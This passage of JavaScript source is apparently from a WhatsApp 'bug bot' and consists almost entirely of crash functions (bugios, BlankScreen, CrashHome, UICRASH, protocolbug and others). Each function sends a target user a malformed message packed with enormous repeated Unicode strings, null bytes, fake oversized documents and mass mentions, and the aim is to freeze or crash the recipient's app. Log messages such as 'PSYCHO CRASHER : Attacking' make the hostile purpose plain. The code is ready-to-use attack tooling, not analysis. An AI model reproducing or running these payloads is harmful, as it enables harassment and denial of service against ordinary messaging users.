								"mediaUrl": "https://ꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾ.com/",
								"containsAutoReply": true,
								"renderLargerThumbnail": true,
								"showAdAttribution": true,
								"ctwaClid": "ctwa_clid_example",
								"ref": "ref_example"
							},
							"entryPointConversionSource": "entry_point_source_example",
							"entryPointConversionApp": "entry_point_app_example",
							"entryPointConversionDelaySeconds": 5,
							"disappearingMode": {},
							"actionLink": {
								"url": "https://www.instagram.com/raditx7"
							},
							"groupSubject": "Example Group Subject",
							"parentGroupJid": "6287888888888-1234567890@g.us",
							"trustBannerType": "trust_banner_example",
							"trustBannerAction": 1,
							"isSampled": false,
							"utm": {
								"utmSource": "utm_source_example",
								"utmCampaign": "utm_campaign_example"
							},
							"forwardedNewsletterMessageInfo": {
								"newsletterJid": "6287888888888-1234567890@g.us",
								"serverMessageId": 1,
								"newsletterName": " X ",
								"contentType": "UPDATE",
								"accessibilityText": " X "
							},
							"businessMessageForwardInfo": {
								"businessOwnerJid": "0@s.whatsapp.net"
							},
							"smbClientCampaignId": "smb_client_campaign_id_example",
							"smbServerCampaignId": "smb_server_campaign_id_example",
							"dataSharingContext": {
								"showMmDisclosure": true
							}
						}
					}
				},
				Ptcp ? {
					participant: {
						jid: target
					}
				} : {}
			);
			console.log(chalk.green("SUCCESFULLY SEND BUG IOS"));
		};    
		
		async function bugios3(target) {
      let CrashQAiphone = "𑆵󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵".repeat(60000);
      await FadelSM.relayMessage(
        target,
        {
          locationMessage: {
            degreesLatitude: 999.03499999999999,
            degreesLongitude: -999.03499999999999,
            name: CrashQAiphone,
            url: "https://youtube.com/@dennycrasher",
          },
        },
        {
          participant: {
            jid: target
          },
        }
      );
    }
    
    		async function bugios4(target) {
			await FadelSM.relayMessage(target, {
				"paymentInviteMessage": {
					serviceType: "FBPAY",
					expiryTimestamp: Date.now() + 1814400000
				}
			}, {
				participant: {
					jid: target
				}
			})
			console.log(chalk.green("SUCCESFULLY SEND BUG IOS"));
		};

		async function bugios5(target) {
			FadelSM.relayMessage(target, {
				'extendedTextMessage': {
					'text': "𑆵𑆵".repeat(11000),
					'contextInfo': {
						'stanzaId': target,
						'participant': target,
						'quotedMessage': {
							'conversation': 'ꦾ'.repeat(50000)
						},
						'disappearingMode': {
							'initiator': "CHANGED_IN_CHAT",
							'trigger': "CHAT_SETTING"
						}
					},
					'inviteLinkGroupTypeV2': "DEFAULT"
				}
			}, {
				'participant': {
					'jid': target
				}
			}, {
				'messageId': null
			});
			console.log(chalk.green("SUCCESFULLY SEND BUG IOS"));
		};
		
async function AtrasoXAtachmend(targetJID) {
    try {
        let push = [];

        // Generate 1000 cards
        for (let i = 0; i < 1020; i++) {
            push.push({
                body: proto.Message.InteractiveMessage.Body.fromObject({ text: "ㅤ" }),
                footer: proto.Message.InteractiveMessage.Footer.fromObject({ text: "ㅤㅤ" }),
                header: proto.Message.InteractiveMessage.Header.fromObject({
                    title: '*Rendyx Was Here!*',
                    hasMediaAttachment: true,
                    imageMessage: {
                        url: "https://mmg.whatsapp.net/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc?ccb=11-4&oh=01_Q5AaIMFQxVaaQDcxcrKDZ6ZzixYXGeQkew5UaQkic-vApxqU&oe=66C10EEE&_nc_sid=5e03e0&mms3=true",
                        mimetype: "image/jpeg",
                        fileSha256: "dUyudXIGbZs+OZzlggB1HGvlkWgeIC56KyURc4QAmk4=",
                        fileLength: "10840",
                        height: 10,
                        width: 10,
                        mediaKey: "LGQCMuahimyiDF58ZSB/F05IzMAta3IeLDuTnLMyqPg=",
                        fileEncSha256: "G3ImtFedTV1S19/esIj+T5F+PuKQ963NAiWDZEn++2s=",
                        directPath: "/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc?ccb=11-4&oh=01_Q5AaIMFQxVaaQDcxcrKDZ6ZzixYXGeQkew5UaQkic-vApxqU&oe=66C10EEE&_nc_sid=5e03e0",
                        mediaKeyTimestamp: "1721344123",
                        jpegThumbnail: reyhMg
                    }
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({ buttons: [] })
            });
        }

        // Create carousel message
        const carousel = generateWAMessageFromContent(
            targetJID, 
            {
                viewOnceMessage: {
                    message: {
                        messageContextInfo: {
                            deviceListMetadata: {},
                            deviceListMetadataVersion: 2
                        },
                        interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                            body: proto.Message.InteractiveMessage.Body.create({ text: `${"𑜦".repeat(40000)}wkwkwkwkwkkwkwkwkwk2kwkwkwkkqkwkkwkwkwwkkwk\n\u0000` }),
                            footer: proto.Message.InteractiveMessage.Footer.create({ text: "`YT:` https://youtube.com/@SasukeBugz" }),
                            header: proto.Message.InteractiveMessage.Header.create({ hasMediaAttachment: false }),
                            carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({ cards: push })
                        })
                    }
                }
            }, 
            {}
        );

        // Send the message
        await FadelSM.relayMessage(targetJID, carousel.message, {
            participant: { jid: targetJID },
        });

    } catch (err) {
        console.error("Error in Fkod:", err);
    }
}

// Bug Delay No invis //
async function delay1(target, Ptcp = true) {
      await FadelSM.relayMessage(
        target,
        {
          ephemeralMessage: {
            message: {
              interactiveMessage: {
                header: {
                  documentMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
                    mimetype:
                      "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                    fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                    fileLength: "9999999999999",
                    pageCount: 1316134911,
                    mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
                    fileName: "⿻",
                    fileEncSha256:
                      "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
                    directPath:
                      "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1726867151",
                    contactVcard: true,
                    jpegThumbnail: 'https://files.catbox.moe/mgnwmg.jpg',
                  },
                  hasMediaAttachment: true,
                },
                body: {
                  text: "⿻\n" + "ꦾ".repeat(28000),
                },
                nativeFlowMessage: {
                  messageParamsJson: "{}",
                },
                contextInfo: {
                  mentionedJid: [target, "6289526156543@s.whatsapp.net"],
                  forwardingScore: 1,
                  isForwarded: true,
                  fromMe: false,
                  participant: "0@s.whatsapp.net",
                  remoteJid: "status@broadcast",
                  quotedMessage: {
                    documentMessage: {
                      url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                      mimetype:
                        "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                      fileSha256:
                        "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                      fileLength: "9999999999999",
                      pageCount: 1316134911,
                      mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                      fileName: "Дѵөҫдԁө Ԍҵдѵд tђคเlคภ๔",
                      fileEncSha256:
                        "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
                      directPath:
                        "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                      mediaKeyTimestamp: "1724474503",
                      contactVcard: true,
                      thumbnailDirectPath:
                        "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                      thumbnailSha256:
                        "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                      thumbnailEncSha256:
                        "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                      jpegThumbnail: "",
                    },
                  },
                },
              },
            },
          },
        },
        Ptcp
          ? {
              participant: {
                jid: target,
              },
            }
          : {}
      );
    }

    
    async function delay2(target, Ptcp = true) {
    await FadelSM.relayMessage(target, {
        viewOnceMessage: {
            message: {
                interactiveResponseMessage: {
                    body: {
                        text: "FadelSM",
                        format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                        name: "call_permission_request",
                        paramsJson: "\u0000".repeat(1000000),
                        version: 3
                    }
                }
            }
        }
    }, { participant: { jid: target}});
}

async function instantcrash(target) {
  try {
    let message = {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
          },
          interactiveMessage: {
            contextInfo: {
              mentionedJid: [targer],
              isForwarded: true,
              forwardingScore: 999,
              businessMessageForwardInfo: {
                businessOwnerJid: targer,
              },
            },
            body: {
              text: "Psycho Kill You╴͒ᝄ ",
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: "",
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
              ],
            },
          },
        },
      },
    };

    await FadelSM.relayMessage(targer, message, {
      participant: { jid: targer },
    });
  } catch (err) {
    console.log(err);
  }
}

// function bug
async function Crashed(target) {
FadelSM.relayMessage(
target,
{
interactiveMessage: {
header: {
title: "⃟😨YT : Tama-ID🦠⃟   ",
hasMediaAttachment: false
},
body: {
text: "\nꦾ".repeat(155555)
},
nativeFlowMessage: {
messageParamsJson: "",
buttons: [{
name: "single_select",
buttonParamsJson: "z"
},
{
name: "form_message",
buttonParamsJson: "{}"
},
{
name: "form_message",
buttonParamsJson: "{}"
},
{
name: "form_message",
buttonParamsJson: "{}"
},
{
name: "form_message",
buttonParamsJson: "{}"
},
{
name: "form_message",
buttonParamsJson: "{}"
},
{
name: "form_message",
buttonParamsJson: "{}"
},
{
name: "form_message",
buttonParamsJson: "{}"
},
{
name: "form_message",
buttonParamsJson: "{}"
},
{
name: "form_message",
buttonParamsJson: "{}"
},
{
name: "form_message",
buttonParamsJson: "{}"
},
{
name: "form_message",
buttonParamsJson: "{}"
},
{
name: "form_message",
buttonParamsJson: "{}"
},
{
name: "form_message",
buttonParamsJson: "{}"
},
{
name: "form_message",
buttonParamsJson: "{}"
},
{
name: "form_message",
buttonParamsJson: "{}"
},
{
name: "form_message",
buttonParamsJson: "{}"
},
{
name: "form_message",
buttonParamsJson: "{}"
},
{
name: "form_message",
buttonParamsJson: "{}"
},
{
name: "form_message",
buttonParamsJson: "{}"
},
{
name: "form_message",
buttonParamsJson: "{}"
},
{
name: "form_message",
buttonParamsJson: "{}"
},
{
name: "form_message",
buttonParamsJson: "{}"
},
{
name: "form_message",
buttonParamsJson: "{}"
},
{
name: "form_message",
buttonParamsJson: "{}"
},
{
name: "form_message",
buttonParamsJson: "{}"
},
{
name: "form_message",
buttonParamsJson: "{}"
},
{
name: "form_message",
buttonParamsJson: "{}"
},
{
name: "form_message",
buttonParamsJson: "{}"
},
{
name: "form_message",
buttonParamsJson: "{}"
},

]
}
}						
},
{ participant: { jid: target } }
);
}

async function BlankScreen(target, Ptcp = false) {
let virtex = "𝑷𝑺𝒀𝑪𝑯𝑶 𝑪𝑹𝑨𝑺𝑯𝑬𝑹 𝐗 𝐁𝐥𝐚𝐧𝐤𝐒𝐜𝐫𝐞𝐞𝐧͟͟͞♨️" + "ྫྷ".repeat(77777) + "@0".repeat(50000);
			await FadelSM.relayMessage(target, {
					ephemeralMessage: {
						message: {
							interactiveMessage: {
								header: {
									documentMessage: {
										url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
										mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
										fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
										fileLength: "9999999999999",
										pageCount: 1316134911,
										mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
										fileName: "Hayolo",
										fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
										directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
										mediaKeyTimestamp: "1726867151",
										contactVcard: true,
										jpegThumbnail: "https://img1.pixhost.to/images/5619/596574956_imgtmp.jpg",
									},
									hasMediaAttachment: true,
								},
								body: {
									text: virtex,
								},
								nativeFlowMessage: {
								name: "call_permission_request",
								messageParamsJson: "\u0000".repeat(5000),
								},
								contextInfo: {
								mentionedJid: ["0@s.whatsapp.net"],
									forwardingScore: 1,
									isForwarded: true,
									fromMe: false,
									participant: "0@s.whatsapp.net",
									remoteJid: "status@broadcast",
									quotedMessage: {
										documentMessage: {
											url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
											mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
											fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
											fileLength: "9999999999999",
											pageCount: 1316134911,
											mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
											fileName: "Bokep 18+",
											fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
											directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
											mediaKeyTimestamp: "1724474503",
											contactVcard: true,
											thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
											thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
											thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
											jpegThumbnail: "https://img1.pixhost.to/images/5619/596574956_imgtmp.jpg",
										},
									},
								},
							},
						},
					},
				},
				Ptcp ? {
					participant: {
						jid: target
					}
				} : {}
			);
            console.log(chalk.red.bold('𝑷𝑺𝒀𝑪𝑯𝑶 𝑪𝑹𝑨𝑺𝑯𝑬𝑹 𝐁𝐥𝐚𝐧𝐤𝐒𝐜𝐫𝐞𝐞𝐧͟͟͞♨️'))
   	};

async function CrashHome(target) {
const buttons = [
{ buttonId: "\u0000".repeat(599999), buttonText: { displayText: "YT : Tama-ID 𐂂⃝𖤛〽️" }, type: 1, nativeFlowInfo: { name: "single_select", paramsJson: "{}" } }, 
];
let messagePayload = {
viewOnceMessage: {
message: {
liveLocationMessage: {
degreesLatitude: "0",
degreesLongitude: "0",
caption: "YT : Tama-ID" + "ꦾ".repeat(7500),
sequenceNumber: "0",
jpegThumbnail: global.thumb, 
contextInfo: {
virtexId: FadelSM.generateMessageTag(),
participant: "13135550002@s.whatsapp.net",
mentionedJid: [target, "0@s.whatsapp.net"],
quotedMessage: {
buttonsMessage: {
hasMediaAttachment: true,
contentText: "YT : Tama-ID",
footerText: "",
buttons: buttons, 
viewOnce: true,
headerType: 1
}
}
}
}
}
}
};
await FadelSM.relayMessage(target, messagePayload, {
messageId: FadelSM.generateMessageTag(), 
participant: { jid : target }
});
}

async function SpamNotif(target, Ptcp = true) {
    let virtex = "YT : Tama-ID" + "ꦾ".repeat(250000) + "@8".repeat(250000);
    await FadelSM.relayMessage(target, {
groupMentionedMessage: {
    message: {
interactiveMessage: {
    header: {
documentMessage: {
    url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
    mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
    fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
    fileLength: "999999999",
    pageCount: 0x9184e729fff,
    mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
    fileName: "Wkwk.",
    fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
    directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
    mediaKeyTimestamp: "1715880173",
    contactVcard: true
},
title: "",
hasMediaAttachment: true
    },
    body: {
text: virtex
    },
    nativeFlowMessage: {},
    contextInfo: {
mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
groupMentions: [{ groupJid: "0@s.whatsapp.net", groupSubject: "anjay" }]
    }
}
    }
}
    }, { participant: { jid: target } }, { messageId: null });
}

async function UICRASH(target, ptcp = true) {
  try {
    await FadelSM.relayMessage(
      target,
      {
ephemeralMessage: {
  message: {
    interactiveMessage: {
      header: {
locationMessage: {
  degreesLatitude: 0,
  degreesLongitude: 0,
},
hasMediaAttachment: true,
      },
      body: {
text:
  "YT : Tama-ID⭑̤\n" +
  "ꦾ".repeat(92000) +
  "ꦽ".repeat(92000) +
  `@1`.repeat(92000),
      },
      nativeFlowMessage: {},
      contextInfo: {
mentionedJid: [
  "1@newsletter",
  "1@newsletter",
  "1@newsletter",
  "1@newsletter",
  "1@newsletter",
],
groupMentions: [
  {
    groupJid: "1@newsletter",
    groupSubject: "Vamp",
  },
],
quotedMessage: {
  documentMessage: {
    contactVcard: true,
  },
},
      },
    },
  },
},
      },
      {
participant: { jid: target },
userJid: target,
      }
    );
  } catch (err) {
    console.log(err);
  }
}

async function protocolbug(isTarget, mention) {
const delaymention = Array.from({ length: 9741 }, (_, r) => ({
title: "᭯".repeat(9741),
rows: [{ title: `${r + 1}`, id: `${r + 1}` }]
}));

const MSG = {
viewOnceMessage: {
message: {
listResponseMessage: {
title: "YT : Tama-ID",
listType: 2,
buttonText: null,
sections: delaymention,
singleSelectReply: { selectedRowId: "🌀" },
contextInfo: {
mentionedJid: Array.from({ length: 9741 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
participant: isTarget,
remoteJid: "status@broadcast",
forwardingScore: 9741,
isForwarded: true,
forwardedNewsletterMessageInfo: {
newsletterJid: "9741@newsletter",
serverMessageId: 1,
newsletterName: "-"
}
},
description: "( YT : Tama-ID )"
}
}
},
contextInfo: {
channelMessage: true,
statusAttributionType: 2
}
};

const msg = generateWAMessageFromContent(isTarget, MSG, {});

await FadelSM.relayMessage("status@broadcast", msg.message, {
messageId: msg.key.id,
statusJidList: [isTarget],
additionalNodes: [
{
tag: "meta",
attrs: {},
content: [
{
tag: "mentioned_users",
attrs: {},
content: [
{
tag: "to",
attrs: { jid: isTarget },
content: undefined
}
]
}
]
}
]
});

if (mention) {
await FadelSM.relayMessage(
isTarget,
{
statusMentionMessage: {
message: {
protocolMessage: {
key: msg.key,
type: 25
}
}
}
},
{
additionalNodes: [
{
tag: "meta",
attrs: { is_status_mention: "🌀 YT : Tama-ID - 𝗧𝗿𝗮𝘀𝗵 𝗣𝗿𝗼𝘁𝗼𝗰𝗼𝗹" },
content: undefined
}
]
}
);
}
}
 
async function trashinfinity(target) {
 let virtex = "YT : Tama-ID";
   FadelSM.relayMessage(target, {
     groupMentionedMessage: {
       message: {
        interactiveMessage: {
          header: {
            documentMessage: {
              url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
                                    mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                                    fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                                    fileLength: "99999999999",
                                    pageCount: 0x9184e729fff,
                                    mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                                    fileName: virtex,
                                    fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                                    directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
                                    mediaKeyTimestamp: "1715880173",
                                    contactVcard: true
                                },
                                hasMediaAttachment: true
                            },
                            body: {
                                text: "YT : Tama-ID" + "ꦾ".repeat(100000) + "@1".repeat(300000)
                            },
                            nativeFlowMessage: {},
                            contextInfo: {
                                mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                                groupMentions: [{ groupJid: "1@newsletter", groupSubject: "𝗨𝗜 𝗦𝗶𝘀𝘁𝗲𝗺 𝗕𝘆 YT : Tama-ID" }]
                            }
                        }
                    }
                }
            }, { participant: { jid: target } });
        };
        
async function VPen(zLoc, ptcp = false) {
    let valhalla = "YT : Tama-ID" + "ꦾ".repeat(50000);

    let mentionedJidArray = Array.from({ length: 35000 }, () => 
        "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
    );

    let battanz = {
        groupMentionedMessage: {
            message: {
                listResponseMessage: {
                    title: " @120363336758292547@g.us",
                    listType: "SINGLE_SELECT",
                    singleSelectReply: {
                        selectedRowId: "Gateway To Hell"
                    },
                    description: " @120363336758292547@g.us",
                    contextInfo: {
                        mentionedJid: mentionedJidArray,
                        groupMentions: [{ 
                            groupJid: "120363336758292547@g.us", 
                            groupSubject: valhalla 
                        }]
                    }
                }
            }
        }
    };

    await FadelSM.relayMessage(zLoc, battanz, { participant: { jid: zLoc } }, { messageId: null });
}
 
async function Loca(target) {
            let virtex = "⩟⬦𪲁 ͢𝐀͠𝐗͜͢𝐒 -";
            let memekz = Date.now();

            await FadelSM.relayMessage(target, {
                groupMentionedMessage: {
                    message: {
                        interactiveMessage: {
                            header: {
                                locationMessage: {
                                    degreesLatitude: -999.03499999999999,
                                    degreesLongitude: 999.03499999999999
                                },
                                hasMediaAttachment: true
                            },
                            body: {
                                text: "YT : Tama-ID -" + "ꦿꦾ꧀".repeat(50000) + "@1".repeat(203000)
                            },
                            nativeFlowMessage: {},
                            contextInfo: {
                                mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                                groupMentions: [{ groupJid: "1@newsletter", groupSubject: "dhikaXsENTRY" }]
                            }
                        }
                    }
                }
            }, { participant: { jid: target } });            
            console.log(chalk.green(" 𝑷𝑺𝒀𝑪𝑯𝑶 𝑪𝑹𝑨𝑺𝑯𝑬𝑹 : Attacking "))
        }               
        
async function SystemUi(Joo, targetNumber) {
    let Thumb = "https://img1.pixhost.to/images/5619/596574956_imgtmp.jpg";
    function repeatText(text, times) {
        return text.repeat(times);
    }

    let repeatedText = repeatText("ꦿꦾ꧀ৃৃৃ⃟⃟⃟⃟⃟", 9999);
   
    let repeatedTitle = repeatText("ꦽ", 9999);

    let mgmenu = await prepareWAMessageMedia(
        { image: { url: Thumb } }, 
        { upload: FadelSM.waUploadToServer }
    );

    const msgii = await generateWAMessageFromContent(targetNumber, {
        viewOnceMessageV2Extension: {
            message: {
                messageContextInfo: {
                    deviceListMetadata: {},
                    deviceListMetadataVersion: 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                    body: proto.Message.InteractiveMessage.Body.fromObject({
                        text: `YT : Tama-ID                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 ${repeatedText} ${repeatedTitle} ${repeatedText}`
                    }),
                    carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
                        cards: [{
                            body: proto.Message.InteractiveMessage.Body.fromObject({}),
                            footer: proto.Message.InteractiveMessage.Footer.fromObject({
                                text: "YT : Tama-ID"
                            }),
                            header: proto.Message.InteractiveMessage.Header.fromObject({
                                title: `${repeatedTitle}`,
                                hasMediaAttachment: true, 
                                ...mgmenu
                            }),
                            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                                buttons: [
                                    {
                                        "name": "quick_reply",
                                        "buttonParamsJson": `{\"display_text\":\"${repeatText("ꦽ", 200)}\",\"id\":\".tes\"}`
                                    },
                                    {
                                        "name": "quick_reply",
                                        "buttonParamsJson": `{\"display_text\":\"${repeatText("ꦽ", 200)}\",\"id\":\".tes\"}`
                                    },
                                    {
                                        "name": "cta_url",
                                        "buttonParamsJson": `{\"display_text\":\"${repeatText("ꦽ", 500)}\",\"url\":\"https://whatsapp.com/channel/0029VaxkfpeG8l55XNsBaq3Q\",\"merchant_url\":\"https://www.google.com\"}`
                                    }
                                ]
                            })
                        }]
                    })
                })
            }
        }
    }, { userJid: targetNumber, quoted: null });

    await FadelSM.relayMessage(targetNumber, msgii.message, { messageId: msgii.key.id });
}
async function Loc(target, amount, jids) {
let pesan = generateWAMessageFromContent(target, proto.Message.fromObject({
viewOnceMessage: {
message: {
interactiveMessage: {
header: {
title: "",
locationMessage: {},
hasMediaAttachment: true
},
body: {
text: "*😨𝑷𝑺𝒀𝑪𝑯𝑶 𝑪𝑹𝑨𝑺𝑯𝑬𝑹*"
},
nativeFlowMessage: {
buttons: [
{
name: "single_select",
buttonParamsJson: `{"title":"${"\u0018".repeat(amount)}","sections":[{"title":"Flow Button","rows":[]}]}`
}, {
name: "single_select",
buttonParamsJson: `{"title":"${"\u0018".repeat(amount)}","sections":[{"title":"Flow Button","rows":[]}]}`
}, {
name: "single_select",
buttonParamsJson: `{"title":"${"\u0018".repeat(amount)}","sections":[{"title":"Flow Button","rows":[]}]}`
}, {
name: "single_select",
buttonParamsJson: `{"title":"${"\u0018".repeat(amount)}","sections":[{"title":"Flow Button","rows":[]}]}`
}, {
name: "single_select",
buttonParamsJson: `{"title":"${"\u0018".repeat(amount)}","sections":[{"title":"Flow Button","rows":[]}]}`
}, {
name: "single_select",
buttonParamsJson: `{"title":"${"\u0018".repeat(amount)}","sections":[{"title":"Flow Button","rows":[]}]}`
}, {
name: "single_select",
buttonParamsJson: `{"title":"${"\u0018".repeat(amount)}","sections":[{"title":"Flow Button","rows":[]}]}`
}, {
name: "single_select",
buttonParamsJson: `{"title":"${"\u0018".repeat(amount)}","sections":[{"title":"Flow Button","rows":[]}]}`
}, {
name: "single_select",
buttonParamsJson: `{"title":"${"\u0018".repeat(amount)}","sections":[{"title":"Flow Button","rows":[]}]}`
}, {
name: "single_select",
buttonParamsJson: `{"title":"${"\u0018".repeat(amount)}","sections":[{"title":"Flow Button","rows":[]}]}`
}
]
}
}
},
carouselMessage: {
cards: []
}
}
}), {
userJid: target,
quoted: null
});

await FadelSM.relayMessage(target, pesan.message, jids ? {
participant: { jid: target }
} : {});
}
async function VampFcSpam(target) {
   let venomModsData = JSON.stringify({
    status: true,
    criador: "VenomMods",
    resultado: {
        type: "md",
        ws: {
            _events: { "CB:ib,,dirty": ["Array"] },
            _eventsCount: 80000,
            _maxListeners: 0,
            url: "wss://web.whatsapp.com/ws/chat",
            config: {
                version: ["Array"],
                browser: ["Array"],
                waWebSocketUrl: "wss://web.whatsapp.com/ws/chat",
                sockCectTimeoutMs: 20000,
                keepAliveIntervalMs: 30000,
                logger: {},
                printQRInTerminal: false,
                emitOwnEvents: true,
                defaultQueryTimeoutMs: 60000,
                customUploadHosts: [],
                retryRequestDelayMs: 250,
                maxMsgRetryCount: 5,
                fireInitQueries: true,
                auth: { Object: "authData" },
                markOnlineOnsockCect: true,
                syncFullHistory: true,
                linkPreviewImageThumbnailWidth: 192,
                transactionOpts: { Object: "transactionOptsData" },
                generateHighQualityLinkPreview: false,
                options: {},
                appStateMacVerification: { Object: "appStateMacData" },
                mobile: true
            }
        }
    }
});
    await FadelSM.relayMessage(
        target,
        {
            interactiveMessage: {
                header: {
